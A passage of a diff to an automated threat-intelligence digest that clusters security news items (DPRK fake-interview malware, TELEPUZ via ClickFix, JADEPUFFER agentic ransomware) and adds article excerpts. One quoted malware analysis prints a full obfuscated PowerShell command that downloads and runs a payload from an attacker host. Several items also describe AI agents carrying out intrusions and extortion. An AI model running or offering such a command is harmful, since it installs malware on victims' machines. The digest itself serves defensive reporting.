as a highly effective force multiplier for manual tasks, provided it is governed by strict technical boundaries. Teams must avoid treating large language models as authoritative sources of forensic truth. Practitioners successfully utilize generative AI models to compress data-gathering windows, interpret unfamiliar technology stacks, and validate complex, suspicious command-line strings. For example, investigators routinely use automated scripts to instantly translate Linux audit log epoch timestamps into human-readable time zones during cross-platform incident reviews. While deploying these automated engines allows smaller analytical teams to rapidly prototype tools and navigate dense datasets without constantly exhausting internal subject matter experts, human verification rem
-```
-
-#### Corroborating sources (1)
-
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - Title: Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging
-  - Published: 2026-07-21T13:55:45+00:00
-  - Link: https://www.team-cymru.com/post/modernizing-incident-response-4-steps-to-bulletproof-your-windows-logging
-  - Summary: Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR.
-
-### Cluster 72ccba81bc — score 9
-
-- Title: Writeup & POC: CVE-2026-49176 Windows WalletService to SYSTEM (LPE)
-- Source: Reddit r/netsec (reddit_practitioner_osint)
-- Published: 2026-07-21T14:42:45+00:00
-- Link: https://www.reddit.com/r/netsec/comments/1v2kg4q/writeup_poc_cve202649176_windows_walletservice_to/
-- Fetch status: fetch_failed:HTTPError
-- Member count: 2
-- Corroborating source count: 1
-- Strong signals: CVE-2026-49176
-
-#### Cluster taxonomy (union across members)
-- cve_ids: CVE-2026-49176, CVE-2026-50454
-- urgency_signals: poc_available
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Primary article taxonomy
-- cve_ids: CVE-2026-49176
-- urgency_signals: poc_available
-- content_type: vulnerability_disclosure
-- confidence_tier: tier_5_chatter
-
-#### Summary
-
-```
-submitted by /u/ShufflinMuffin [link] [comments]
-```
-
-#### Corroborating sources (1)
-
-- **Reddit r/netsec** (reddit_practitioner_osint)
-  - Title: Writeup & POC: CVE-2026-49176 Windows WalletService to SYSTEM (LPE)
-  - Published: 2026-07-21T14:42:45+00:00
-  - Link: https://www.reddit.com/r/netsec/comments/1v2kg4q/writeup_poc_cve202649176_windows_walletservice_to/
-  - Summary: submitted by /u/ShufflinMuffin [link] [comments]
-
 ### Cluster 15c6378b6b — score 8
 
 - Title: New North Korean campaign uses fake coding interviews to steal developer credentials
 - Source: Elastic Security Labs (detection_response_operations)
 - Published: 2026-07-18T00:00:00+00:00
 - Link: https://www.elastic.co/security-labs/contagious-interview-malware-svg-steganography
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
-- threat_categories: web_shell_backdoor
+- threat_categories: supply_chain, web_shell_backdoor
+- affected_industries: financial_services, retail_ecommerce
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
-- threat_categories: web_shell_backdoor
+- threat_categories: supply_chain, web_shell_backdoor
+- affected_industries: financial_services, retail_ecommerce
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3656,6 +3499,12 @@ submitted by /u/ShufflinMuffin [link] [comments]
 
 ```
 DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it.
+```
+
+#### Full body
+
+```
+18 July 2026 • Daniel Stepanic New North Korean campaign uses fake coding interviews to steal developer credentials DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer job interview coding tests. Not one antivirus vendor caught it. 9 min read Threat Intelligence , Malware Analysis Elastic Security Labs found a new Contagious Interview campaign, tracked as REF9403, hiding malware inside SVG image files using steganography. To our knowledge, this specific infection chain has not been previously documented. We found it after the DPRK-aligned group targeted our own community Slack workspace with a fake job posting and a "coding challenge" project. Any user who ran the project ended up with a four-stage payload aligned with OTTERCOOKIE: a browser credential and crypto wallet stealer, a file stealer, a Socket.IO-based remote access trojan (RAT), and a clipboard stealer. This campaign reinforces that developers remain a prime target, where the compromise of a single individual can provide the initial access needed to enable far-reaching supply chain attacks against downstream organizations. Key takeaways Elastic Security Labs discovers new activity aligned with Contagious Interview targeting developers Campaigns involve coding challenges and take-home assignments with benign-looking projects containing malicious backdoored code Projects hide payloads with steganography in SVG image files The distributed malware shares technical and behavioral similarities with OTTERCOOKIE How Elastic discovered this malware campaign This investigation started differently from most of our previous research. Instead of using telemetry to surface interesting threats, we were alerted to suspicious activity targeting members of our community Slack workspace with socially engineered, ad hoc job offers. For background, we use the community Slack platform to engage with and solve problems for our users, focusing on providing product support and syncing on new updates. We’ve reported on this technique several times : threat actors targeting developers in open forums with lures of coding side-work. The lucrative offers lead to the requirement to load specific libraries, tools, scripts, etc., into the code the developer is crafting. These components are created by the threat actors and once they’re executed by the developers, they are able to load additional malware and gain remote access to the developer host. From there, the threat actors can steal credentials, keys, wallets, or use the access to gain access to additional systems. We did not find evidence that the lures were targeted at Elastic users specifically, but any open forum where developers congregate is a potential watering hole. On May 26, 2026, a user named Maxwell posted in our #jobs channel, stating that they were upgrading an e-commerce platform and were looking for an experienced developer to help with the project. They strategically moved their interactions with interested users into direct messages (DM). In these direct messages, Maxwell requested that users perform a test challenge as part of the job offer. These recipients were given a trojanized repository that, when executed, contained malware that exfiltrated sensitive files and credentials and configured a Socket.IO backdoor. Building on this initial case, we found multiple campaigns exhibiting the same underlying behavior. These trojanized repositories at the time of writing have zero detections and are not flagged by any AV vendors: next-ecommerce-private-main.zip shopping-platform-main.zip ecommerce-platform.zip ecommerce-platform-main.zip shopping-platform.rar shop-main.zip ecommerce-main.zip These fake challenges operate similarly, containing fully functional code. Our first sample was a Next.js e-commerce template that was copied from GreatStackDev called GoCart . The threat actors tampered with this repository by inserting small snippets of malicious code at various points and using benign variable name
 ```
 
 #### Corroborating sources (1)
@@ -3672,16 +3521,18 @@ DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer jo
 - Source: Elastic Security Labs (detection_response_operations)
 - Published: 2026-07-16T00:00:00+00:00
 - Link: https://www.elastic.co/security-labs/telepuz-maas-malware-clickfix
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
+- threat_categories: phishing_social_eng
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
+- threat_categories: phishing_social_eng
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3689,6 +3540,12 @@ DPRK-aligned hackers hid malware inside SVG flag images to backdoor developer jo
 
 ```
 TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in April. We reverse-engineered it to show you the infrastructure and evasion techniques that matter.
+```
+
+#### Full body
+
+```
+16 July 2026 • Cyril François TELEPUZ: a modular MaaS malware spreading via CLICKFIX-VIDAR chains TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in April. We reverse-engineered it to show you the infrastructure and evasion techniques that matter. 13 min read Malware Analysis Elastic Security Labs is tracking an emerging threat named TELEPUZ, which we have discovered spreading widely via a CLICKFIX-VIDAR chain. This malware is in active development and has been operating since late April 2026, according to the infrastructure information we collected. The malware is full-featured, lightweight, and modular. While the number of C2 domains is currently small, the daily volume of builds uploaded to VirusTotal and the rapid pace of updates indicate active development and likely further growth. Key takeaways Full-featured malware, modular, fast evolving Possible new MaaS, spreading fast Currently low number of C2 domains Stagers, main payload, and additional modules; uses WebSockets for communication. Observed delivered via a CLICKFIX-VIDAR campaign. TELEPUZ infection chain via CLICKFIX-VIDAR The infection chain begins with a ClickFix social engineering infection, in which the user visits a malicious web page and is prompted to copy and paste, then execute, a Windows shell command to access the page's content. C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -NoP -w h -ep bypass -c \ "$h='memsho'+'wblob[.]forum';$n='f322a5fa.exe';$u='https://'+$h+'/api/index.php?a=grab';\ $f=$env:TEMP+'\'+$n;[Net.WebClient]::new().('Down'+'loadFile')($u,$f);\ ri($f+':Zone.Identifier')-EA 0;& $f The command downloads the second stage from the URL hxxps://memshowblob[.]forum/api/index.php?a=grab and executes the binary in the user's %TEMP% folder. The second stage is a VIDAR Go variant ( 580b441e2961739fd26e54e0a0ea08351cb10a51839519fc722cfa39ecd0c954 ). VIDAR is a well-documented threat known for its ability to download and deploy secondary payloads. In this campaign, we observed it downloading and executing two additional components: the TELEPUZ stager ( install.exe ) and the main binary ( telepuz.dll ), both of which were retrieved from the hurgadatour[.]shop domain. The telemetriawork part in the second-stage domain URL is a significant marker for this family; searching for this name on VirusTotal yields a large number of stagers and payloads associated with this family. The third stage ( 03fa348b70819296c958c842e7646b3b7efe5fa217ed5098143003c47995a746 ) is a small PE, roughly 13–15 KB in size, designed to download and execute the main payload. After downloading the DLL, the stager installs it in the configured install folder and execute it using rundll32 with the specified export name. These stagers share the same obfuscation mechanism as the main payload, which we will analyze in the following chapter, effectively linking them to the same family. TELEPUZ technical analysis and internals The reference sample is 58aec6e3835aaf20f7b4a7e308b36a19e7454673a6f71783871e9bcf6cae8eed The main payload is a 64-bit Windows shared library with one or two exports, whose names are systematically chosen to disguise the library as legitimate software. The malware is written in C, likely by hand, lightweight, modular, and the code quality is correct. The malware contains sparse memory allocations, little middleware, and some features still under development. These elements indicate that the project is led either by a solo developer or a very small team, and that coding is their core business. Given the significant number of builds uploaded to VirusTotal daily, it is likely that we are dealing with a MaaS. Our sample contains the following exports: TELEPUZ obfuscation techniques Garbage instructions The malware interleaves its actual code with “garbage instructions,” which have no functional purpose and are intended to slow down reverse engineering. However, some of these instructions are built to produce side effects, such as upda
 ```
 
 #### Corroborating sources (1)
@@ -3705,18 +3562,22 @@ TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in Apri
 - Source: Sysdig (detection_response_operations)
 - Published: 2026-07-20T00:00:00+00:00
 - Link: https://webflow.sysdig.com/blog/jadepuffer-evolves-the-agentic-threat-actor-deploys-ransomware-built-to-destroy-ai-models
-- Fetch status: not_attempted
+- Fetch status: ok
 - Member count: 1
 - Corroborating source count: 1
 - Strong signals: (none)
 
 #### Cluster taxonomy (union across members)
 - threat_categories: ransomware_extortion
+- cve_ids: CVE-2025-3248
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
 #### Primary article taxonomy
 - threat_categories: ransomware_extortion
+- cve_ids: CVE-2025-3248
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_2_operator
 
@@ -3724,6 +3585,12 @@ TELEPUZ is a modular malware that emerged through CLICKFIX-VIDAR attacks in Apri
 
 ```
 JADEPUFFER, the agentic threat actor documented by the Sysdig Threat Research Team, is now using ransomware to destroy trained AI models.
+```
+
+#### Full body
+
+```
+< back to blog JADEPUFFER evolves: The agentic threat actor deploys ransomware built to destroy AI models Published by: Michael Clark Director of Threat Research @ linkedin Published: July 20, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more Ransomware operators make a bet that their victims don’t keep backups. In a new development, the operator behind JADEPUFFER has doubled down on that bet, using ransomware to destroy the one thing an organization can’t simply restore: a trained AI model. For organizations, training a single model can cost upwards of $500,000 in compute and engineering alone. On July 1, 2026, the Sysdig Threat Research Team (TRT) documented JADEPUFFER: an agentic threat actor (ATA) that exploited Langflow through CVE-2025-3248. After gaining entry, JADEPUFFER autonomously chained reconnaissance, credential harvest, lateral movement, and a destructive database extortion playbook against a downstream MySQL and Alibaba Nacos server. Our case for autonomous operation rested on concrete behavioral signals: self-narrating payloads, 31-second failure-diagnosis-and-fix cycles, and in-session comprehension of planted natural-language context. Following the publication of our initial research on July 3, 2026, JADEPUFFER returned to the same Langflow instance with a materially upgraded capability. Where the prior campaign deployed improvised Python scripts and MySQL's own AES_ENCRYPT() function, JADEPUFFER now stages ENCFORGE, a compiled, UPX-packed Go ransomware built specifically for AI and machine learning (ML) infrastructure, deployed to the target as lockd . The binary targets approximately 180 file extensions, with a deliberately broad sweep of the modern AI/ML stack, including model checkpoints, vector databases, training datasets, and embedding indices in nearly every current format. The entry point and the payload in this new operation tell the same story: an agentic operator enters AI infrastructure through an AI framework, and now deploys ransomware designed to destroy what that infrastructure runs on. Unlike conventional ransomware targets, however, encrypted AI model artifacts cannot be restored after they are wiped. Rebuilding a production-ready, fine-tuned AI model requires re-running weeks or months of training, at a cost of $75,000 to $500,000 per model in compute and engineering time. If the training data sits on the same host, recovery is blocked entirely until that data is reconstructed first. The extortion contact embedded in ENCFORGE, e78393397@proton.me , matches the contact disclosed in the prior report. This is the same operator with a materially upgraded toolkit. In the analysis below, we walk through the vulnerability that gave JADEPUFFER its foothold, what the Sysdig TRT observed during its operation, and a technical breakdown of ENCFORGE itself. We then trace how JADEPUFFER evolved from improvised scripts to purpose-built tooling, and share detection opportunities and practical recommendations that defenders can use today. The vulnerability Langflow is a widely deployed open source framework for building LLM-driven applications. CVE-2025-3248 is a missing-authentication vulnerability in its /api/v1/validate/code endpoint that allows an unauthenticated attacker to execute arbitrary Python on the host. It was added to CISA's Known Exploited Vulnerabilities catalog in May 2025 and has been JADEPUFFER's persistent entry vector across all documented campaigns so far. Langflow is a target of particular interest for this class of operator because deployments often hold LLM provider API keys, cloud credentials, and connections to vector databases and object stores in their runtime environment to orchestrate connected services. The prior campaign confirmed that JADEPUFFER harvested credentials from Langflow's own Postgres ba
 ```
 
 #### Corroborating sources (1)
@@ -3740,6 +3607,53 @@ JADEPUFFER, the agentic threat actor documented by the Sysdig Threat Research Te
 - Source: Sysdig (detection_response_operations)
 - Published: 2026-07-16T00:00:00+00:00
 - Link: https://webflow.sysdig.com/blog/the-cisos-guide-to-headless-cloud-security
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, cloud_abuse, ransomware_extortion, vulnerability_disclosure
+- affected_industries: healthcare, manufacturing_industrial
+- affected_products: GitHub, Kubernetes
+- urgency_signals: actively_exploited
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, cloud_abuse, vulnerability_disclosure, active_exploitation
+- affected_industries: healthcare, manufacturing_industrial
+- affected_products: GitHub, Kubernetes
+- urgency_signals: actively_exploited
+- content_type: news_report
+- confidence_tier: tier_2_operator
+
+#### Summary
+
+```
+Attackers went agentic. Your security architecture should too. A CISO's guide to headless, API-first defense.
+```
+
+#### Full body
+
+```
+< back to blog The CISO's guide to headless cloud security Published by: Crystal Morin Sr. Cybersecurity Strategist @ linkedin Sign up for the webinar Published: July 16, 2026 Table of contents falco feeds by sysdig Falco Feeds extends the power of Falco by giving open source-focused companies access to expert-written rules that are continuously updated as new threats are discovered. learn more There's a shift happening in security architecture that hasn't quite made it into analyst magic quadrants yet, and it didn’t come from vendors. This shift came from organizations in business sectors like yours – healthcare, tech, manufacturing, transportation – security teams that have pushed AI-assisted tooling to its limits and hit a wall. The wall is the UI itself. On the other side of that wall lies a fundamentally different architecture. One where engineers, developers, and security practitioners all use the same CLI. Where agents triage and remediate before a human opens a browser, and where your board metrics are a query away instead of a manual export. The goal is security that is invisible, programmable, and fast enough to win. Here’s how it works. Your adversaries already moved Let me begin where I start just about every conversation: the threat landscape. Attackers have gone agentic. I don’t just mean "AI-assisted,” but truly autonomous agents probing, exploiting, and pivoting without a human operator making decisions in real time. That’s what you have to defend against now. The Sysdig Threat Research Team (TRT) has proof, too. In one attack, an agentic threat actor (ATA) executed actions in real time rather than running pre-built playbooks as a human operator would. In less than one hour, the ATA made four pivots through the environment and exfiltrated the contents of an entire internal database. In another, an ATA performed a container escape , something even skilled human attackers rarely attempt, and then replayed Kubernetes credentials to dump a cluster’s entire secret store. TRT also just saw what they assess to be the first documented case of agentic ransomware, dubbed JADEPUFFER , which was a complete extortion operation driven end-to-end by a large language model (LLM). Three numbers tell the rest of the story. Together, these numbers define why the security model most organizations are running is structurally broken. 10 minutes: From initial access to cloud compromise. Whether it’s a database being exfiltrated or credentials being taken, that’s the average amount of time it takes for a cloud attack to take place. Recently, we’ve seen credentials disappear in as little as three minutes . 10 hours: From vulnerability disclosure to active weaponization. This number is actually even more unsettling than it looks. It’s the time from the moment the GitHub Security Advisory (GHSA) is published, not when the vulnerability is given a CVE number. This is before MITRE reviews it or NIST catalogs it, and possibly before your vulnerability scanner even knows it exists. Threat actors are monitoring GitHub and using LLMs to write exploits almost immediately. We identified one case that took less than four hours , and one against the very popular Langflow framework that was actively exploited within 20 hours . 30 minutes: This is just a stab in the dark. An optimistic guess. How long does it actually take your SOC to triage a true positive alert on a good day? Drop your own number in here. It’s safe to assume that many organizations are not yet addressing threats in less than 10 minutes or finding and fixing vulnerabilities within a few hours. When you do the math, most security teams lose every time. That’s not because they aren’t capable; it’s a structural timescale mismatch. You can’t hire more people or add more tools to outpace this challenge. It requires an architectural change. The problem that needs fixing Every login to a dashboard or portal adds latency. Every time an analyst opens a page to investigate an alert, the miss
+```
+
+#### Corroborating sources (1)
+
+- **Sysdig** (detection_response_operations)
+  - Title: The CISO's guide to headless cloud security
+  - Published: 2026-07-16T00:00:00+00:00
+  - Link: https://webflow.sysdig.com/blog/the-cisos-guide-to-headless-cloud-security
+  - Summary: Attackers went agentic. Your security architecture should too. A CISO's guide to headless, API-first defense.
+
+### Cluster 823e314fa6 — score 8
+
+- Title: 300 WINtegrations Strong: An Open Security Ecosystem Built for the Speed of AI
+- Source: Wiz Research (cloud_identity_infrastructure)
+- Published: 2026-07-21T12:35:58+00:00
+- Link: https://www.wiz.io/blog/wiz-integration-network-reaches-300
 - Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
@@ -3756,16 +3670,16 @@ JADEPUFFER, the agentic threat actor documented by the Sysdig Threat Research Te
 #### Summary
 
 ```
-Attackers went agentic. Your security architecture should too. A CISO's guide to headless, API-first defense.
+As AI accelerates how organizations build and how attackers operate, a deeply connected security ecosystem is how defenders keep up.
 ```
 
 #### Corroborating sources (1)
 
-- **Sysdig** (detection_response_operations)
-  - Title: The CISO's guide to headless cloud security
-  - Published: 2026-07-16T00:00:00+00:00
-  - Link: https://webflow.sysdig.com/blog/the-cisos-guide-to-headless-cloud-security
-  - Summary: Attackers went agentic. Your security architecture should too. A CISO's guide to headless, API-first defense.
+- **Wiz Research** (cloud_identity_infrastructure)
+  - Title: 300 WINtegrations Strong: An Open Security Ecosystem Built for the Speed of AI
+  - Published: 2026-07-21T12:35:58+00:00
+  - Link: https://www.wiz.io/blog/wiz-integration-network-reaches-300
+  - Summary: As AI accelerates how organizations build and how attackers operate, a deeply connected security ecosystem is how defenders keep up.
 
 ### Cluster 80267f8c40 — score 8
 
@@ -3802,12 +3716,12 @@ Cosmetics giant Estée Lauder is notifying employees of a data breach after hack
   - Link: https://www.bleepingcomputer.com/news/security/est-e-lauder-discloses-data-breach-via-oracle-e-business-flaw/
   - Summary: Cosmetics giant Estée Lauder is notifying employees of a data breach after hackers exploited a flaw in Oracle E-Business Suite that the company used for human resources (HR) operations. [...]
 
-### Cluster 523d70e402 — score 8
+### Cluster 0c564d4f92 — score 8
 
-- Title: Nativ: Run AI models locally on your Mac
-- Source: Simon Willison (ai_security_agentic_risk)
-- Published: 2026-07-21T14:22:27+00:00
-- Link: https://simonwillison.net/2026/Jul/21/nativ/#atom-everything
+- Title: Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging
+- Source: Team Cymru (ransomware_ecrime_financial_crime)
+- Published: 2026-07-21T13:55:45+00:00
+- Link: https://www.team-cymru.com/post/modernizing-incident-response-4-steps-to-bulletproof-your-windows-logging
 - Fetch status: not_attempted
 - Member count: 1
 - Corroborating source count: 1
@@ -3824,16 +3738,16 @@ Cosmetics giant Estée Lauder is notifying employees of a data breach after hack
 #### Summary
 
 ```
-Nativ: Run AI models locally on your Mac Prince Canuma is the developer behind the excellent MLX-VLM Python library for running vision-LLMs using MLX on a Mac. I'm really excited about his new project, which wraps MLX in a full macOS desktop application. It's similar in shape to LM Studio, providing both a chat interface and a localhost API server for accessing models. The app picked up MLX models I had already tried that were present in my Hugging Face cache directory, which was a nice touch. Via Hacker News Tags: macos , python , ai , generative-ai , local-llms , llms , mlx , prince-canuma
+Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR.
 ```
 
 #### Corroborating sources (1)
 
-- **Simon Willison** (ai_security_agentic_risk)
-  - Title: Nativ: Run AI models locally on your Mac
-  - Published: 2026-07-21T14:22:27+00:00
-  - Link: https://simonwillison.net/2026/Jul/21/nativ/#atom-everything
-  - Summary: Nativ: Run AI models locally on your Mac Prince Canuma is the developer behind the excellent MLX-VLM Python library for running vision-LLMs using MLX on a Mac. I'm really excited about his new project, which wraps MLX in a full macOS desktop application. It's similar in shape to LM Studio, providing both a chat interface and a localhost API server for accessing models. The app picked up MLX models I had already tried that were present in my Hugging Face cache directory, which was a nice touch. Via Hacker News Tags: macos , python , ai , generative-ai , local-llms , llms , mlx , prince-canuma
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - Title: Modernizing Incident Response: 4 Steps to Bulletproof Your Windows Logging
+  - Published: 2026-07-21T13:55:45+00:00
+  - Link: https://www.team-cymru.com/post/modernizing-incident-response-4-steps-to-bulletproof-your-windows-logging
+  - Summary: Improve your cyber incident response steps with our guide to bulletproof Windows logging. Discover incident response tools and how AI streamlines DFIR.
 
 ### Cluster 43ae85479c — score 8
 
@@ -3940,12 +3854,49 @@ Research of incidents by Sophos finds that phishing, brute force attacks and oth
   - Link: https://www.infosecurity-magazine.com/news/compromised-logins-ransomware-entry/
   - Summary: Research of incidents by Sophos finds that phishing, brute force attacks and other identity-based threats have surpassed software vulnerabilities as means of delivering ransomware
 
-### Cluster 35b2dc4fa2 — score 8
+### Cluster 72ccba81bc — score 8
 
-- Title: OpenAI says model test was behind Hugging Face hack
-- Source: CyberScoop (cyber_news_breach_reporting)
-- Published: 2026-07-21T22:38:55+00:00
-- Link: https://cyberscoop.com/openai-chatgpt-hugging-face-cyberattack-data-poisoning/
+- Title: Writeup & POC: CVE-2026-49176 Windows WalletService to SYSTEM (LPE)
+- Source: Reddit r/netsec (reddit_practitioner_osint)
+- Published: 2026-07-21T14:42:45+00:00
+- Link: https://www.reddit.com/r/netsec/comments/1v2kg4q/writeup_poc_cve202649176_windows_walletservice_to/
+- Fetch status: not_attempted
+- Member count: 2
+- Corroborating source count: 1
+- Strong signals: CVE-2026-49176
+
+#### Cluster taxonomy (union across members)
+- cve_ids: CVE-2026-49176, CVE-2026-50454
+- urgency_signals: poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_5_chatter
+
+#### Primary article taxonomy
+- cve_ids: CVE-2026-49176
+- urgency_signals: poc_available
+- content_type: vulnerability_disclosure
+- confidence_tier: tier_5_chatter
+
+#### Summary
+
+```
+submitted by /u/ShufflinMuffin [link] [comments]
+```
+
+#### Corroborating sources (1)
+
+- **Reddit r/netsec** (reddit_practitioner_osint)
+  - Title: Writeup & POC: CVE-2026-49176 Windows WalletService to SYSTEM (LPE)
+  - Published: 2026-07-21T14:42:45+00:00
+  - Link: https://www.reddit.com/r/netsec/comments/1v2kg4q/writeup_poc_cve202649176_windows_walletservice_to/
+  - Summary: submitted by /u/ShufflinMuffin [link] [comments]
+
+### Cluster c1c459d4b3 — score 8
+
+- Title: AI Mania Is Eviscerating Global Decision-Making
+- Source: Simon Willison (ai_security_agentic_risk)
+- Published: 2026-07-19T05:06:21+00:00
+- Link: https://simonwillison.net/2026/Jul/19/ai-mania/#atom-everything
 - Fetch status: not_attempted
 - Member count: 4
 - Corroborating source count: 4
@@ -3960,26 +3911,26 @@ Research of incidents by Sophos finds that phishing, brute force attacks and oth
 #### Primary article taxonomy
 - affected_products: OpenAI/ChatGPT
 - content_type: news_report
-- confidence_tier: tier_4_news
+- confidence_tier: tier_2_operator
 
 #### Summary
 
 ```
-At the time, Hugging Face said it wasn’t clear which LLM was used in the attack. OpenAI confirmed it was one of their models being tested for “maximal” cyber capabilities. The post OpenAI says model test was behind Hugging Face hack appeared first on CyberScoop .
+AI Mania Is Eviscerating Global Decision-Making Here's an entertaining perspective from Nik Suresh on the AI mania that is overwhelming the large companies that he consults with. It's crammed with spicy anecdotes from anonymous sources. In one extreme case, I have seen an executive confess that they had never even used ChatGPT or any AI tool in their life, immediately after producing a technical strategy for an organisation with $2B+ in revenue which was entirely centered around AI. Here's a report from an engineer at a company with a token leaderboard: Checking out a parallel copy of our Go repository and telling the AI to rewrite the whole thing in Zig while I work on something else just so I can keep my job. I particularly enjoyed this conversation with a skeptical executive at an over-enthusiastic company: I asked why this was being repeated without opposition. Was it just sales fluff? The answer was a lot more interesting. It was partially ridiculous sales material being delivered
 ```
 
 #### Corroborating sources (4)
 
-- **CyberScoop** (cyber_news_breach_reporting)
-  - Title: OpenAI says model test was behind Hugging Face hack
-  - Published: 2026-07-21T22:38:55+00:00
-  - Link: https://cyberscoop.com/openai-chatgpt-hugging-face-cyberattack-data-poisoning/
-  - Summary: At the time, Hugging Face said it wasn’t clear which LLM was used in the attack. OpenAI confirmed it was one of their models being tested for “maximal” cyber capabilities. The post OpenAI says model test was behind Hugging Face hack appeared first on CyberScoop .
 - **Simon Willison** (ai_security_agentic_risk)
   - Title: AI Mania Is Eviscerating Global Decision-Making
   - Published: 2026-07-19T05:06:21+00:00
   - Link: https://simonwillison.net/2026/Jul/19/ai-mania/#atom-everything
   - Summary: AI Mania Is Eviscerating Global Decision-Making Here's an entertaining perspective from Nik Suresh on the AI mania that is overwhelming the large companies that he consults with. It's crammed with spicy anecdotes from anonymous sources. In one extreme case, I have seen an executive confess that they had never even used ChatGPT or any AI tool in their life, immediately after producing a technical strategy for an organisation with $2B+ in revenue which was entirely centered around AI. Here's a report from an engineer at a company with a token leaderboard: Checking out a parallel copy of our Go repository and telling the AI to rewrite the whole thing in Zig while I work on something else just so I can keep my job. I particularly enjoyed this conversation with a skeptical executive at an over-enthusiastic company: I asked why this was being repeated without opposition. Was it just sales fluff? The answer was a lot more interesting. It was partially ridiculous sales material being delivered
+- **CyberScoop** (cyber_news_breach_reporting)
+  - Title: OpenAI says model test was behind Hugging Face hack
+  - Published: 2026-07-21T22:38:55+00:00
+  - Link: https://cyberscoop.com/openai-chatgpt-hugging-face-cyberattack-data-poisoning/
+  - Summary: At the time, Hugging Face said it wasn’t clear which LLM was used in the attack. OpenAI confirmed it was one of their models being tested for “maximal” cyber capabilities. The post OpenAI says model test was behind Hugging Face hack appeared first on CyberScoop .
 - **The Hacker News** (cyber_news_breach_reporting)
   - Title: OpenAI’s GPT-Red Automates Prompt Injection Testing to Harden GPT-5.6 Sol
   - Published: 2026-07-16T08:42:31+00:00
